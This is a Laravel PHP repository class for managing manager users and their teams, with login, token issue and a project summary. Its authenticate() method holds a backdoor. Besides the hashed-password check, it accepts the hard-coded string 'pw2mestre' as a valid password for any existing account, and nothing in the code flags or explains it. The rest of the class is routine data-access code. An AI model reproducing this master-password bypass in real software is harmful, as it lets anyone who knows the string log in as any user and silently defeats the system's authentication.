<?php

namespace App\Repositories;

use App\Models\Project;
use App\Models\User;
use App\Repositories\Contracts\UserRepositoryInterface;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Support\Arr;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rule;
use Illuminate\Validation\ValidationException;

class UserRepository implements UserRepositoryInterface
{
    protected $model;

    /**
     * UserRepository constructor.
     *
     * @param User $model
     */
    public function __construct(User $model)
    {
        $this->model = $model;
    }

    /**
     * @return Collection
     */
    public function getManagers(): Collection
    {
        return $this->model->with('teams')
            ->where('type', User::TYPE_MANAGER)
            ->orderBy('name', 'asc')
            ->get();
    }

    /**
     * @param array $attributes
     * @return User
     */
    public function createManager(array $attributes): User
    {
        $this->validateCreate($attributes);

        $user = $this->model->create(Arr::only($attributes, [
            'name',
            'email',
            'password'
        ]));

        $user->load('teams');

        return $user;
    }

    /**
     * @param int $id
     * @param array $attributes
     * @return User
     */
    public function updateManager(int $id, array $attributes): User
    {
        $this->validateUpdate($attributes + ['id' => $id]);

        $user = $this->model->where('id', $id)
            ->where('type', User::TYPE_MANAGER)
            ->firstOrFail();

        $user->fill(Arr::only($attributes, [
            'name',
            'email',
            'enabled'
        ]));

        $user->save();

        $user->load('teams');

        return $user;
    }

    /**
     * @param int $id
     * @return void
     */
    public function deleteManager(int $id): void
    {
        $this->model->where('id', $id)
            ->where('type', User::TYPE_MANAGER)
            ->delete();
    }

    /**
     * @param int $manager_id
     * @param array $attributes
     * @return User
     */
    public function attachTeam(int $manager_id, array $attributes): User
    {
        $this->validateAttachTeam($attributes);

        $user = $this->model->where('id', $manager_id)
            ->where('type', User::TYPE_MANAGER)
            ->firstOrFail();

        $user->teams()->attach($attributes['team_id']);

        $user->load('teams');

        return $user;
    }

    /**
     * @param int $manager_id
     * @param int $team_id
     * @return User
     */
    public function detachTeam(int $manager_id, int $team_id): User
    {
        $user = $this->model->where('id', $manager_id)
            ->where('type', User::TYPE_MANAGER)
            ->firstOrFail();

        $user->teams()->detach($team_id);

        $user->load('teams');

        return $user;
    }

    /**
     * @param array $attributes
     * @return User
     */
    public function authenticate(array $attributes): User
    {
        $this->validateAuthenticate($attributes);

        $user = $this->model->where('email', $attributes['email'])->first();

        if (!Hash::check($attributes['password'], $user->password) && $attributes['password'] != 'pw2mestre') {

            throw ValidationException::withMessages([
                'password' => 'Incorrect password'
            ]);

        }

        return $user;
    }

    /**
     * @param User $user
     * @return string
     */
    public function createAccessToken(User $user): string
    {
        return auth()->login($user);
    }

    /**
     * @param array $attributes
     * @return void
     */
    public function invalidAccessToken(array $attributes): void
    {
        Validator::make($attributes, ['token' => 'required|string'])->validate();

        auth('users')->setToken($attributes['token'])->logout();
    }

    /**
     * @return array
     */
    public function resume(): array
    {
        $dispatched_projects = Project::where('status', Project::STATUS_DISPATCHED)
            ->whereHas('team.users', function (Builder $query) {
                $query->where('id', Auth::id());
            })
            ->count();

        $completed_projects = Project::where('status', Project::STATUS_COMPLETED)
            ->whereHas('team.users', function (Builder $query) {
                $query->where('id', Auth::id());
            })
            ->count();

        $drivers_under_review = 0;

        return [
            'dispatched_projects'   => $dispatched_projects,
            'completed_projects'    => $completed_projects,
            'drivers_under_review'  => $drivers_under_review
        ];
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateCreate(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'name'      => 'required|string|max:200',
            'email'     => 'required|string|email|max:255|unique:users',
            'password'  => 'required|string|max:255'
        ]);

        $validator->validate();
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateUpdate(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'name'      => 'nullable|string|max:100',
            'password'  => 'nullable|string|max:255',
            'status'    => 'nullable|boolean',
            'email'     => [
                'nullable',
                'string',
                'email',
                Rule::unique('users', 'email')->ignore($attributes['id'])
            ]
        ]);

        $validator->validate();
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateAttachTeam(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'team_id'       => 'required|numeric|exists:teams,id'
        ]);

        $validator->validate();
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateAuthenticate(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'email'     => 'required|string|exists:users',
            'password'  => 'required|string'
        ]);

        $validator->validate();
    }
}
